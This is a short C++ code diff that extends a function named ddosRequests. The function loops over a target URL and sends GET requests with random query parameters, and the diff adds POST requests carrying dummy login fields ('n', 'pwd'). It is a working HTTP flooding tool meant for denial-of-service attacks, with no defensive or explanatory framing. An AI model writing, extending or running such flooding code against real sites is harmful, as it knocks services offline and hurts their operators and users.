@@ -34,16 +34,26 @@ string gen_random(const int len) {
 }
 
 
-void request(string url) {
-	cpr::Response r = cpr::Get(cpr::Url{ url },
-		cpr::Parameters{ {gen_random(5), gen_random(5)} });
-	cout << r.url << endl;
+void request(string url, string method = "get") {
+
+	if (method == string("post")) {
+		cpr::Response r = cpr::Post(cpr::Url{ url },
+			cpr::Payload{ {"n", "asdasdasd"}, {"pwd", "asdasdasd"} });
+		cout << r.url << endl;
+	}
+
+	if (method == string("get")) {
+		cpr::Response r = cpr::Get(cpr::Url{ url },
+			cpr::Parameters{ {gen_random(5), gen_random(5)} });
+		cout << r.url << endl;
+	}
 }
 
 void ddosRequests(int retrys, string url) {
 	long int iter = 0;
 	for (iter; iter <= retrys; iter++) { //кол-во повторений
 		request(url);
+		request(url, "post");
 	}
 }
 
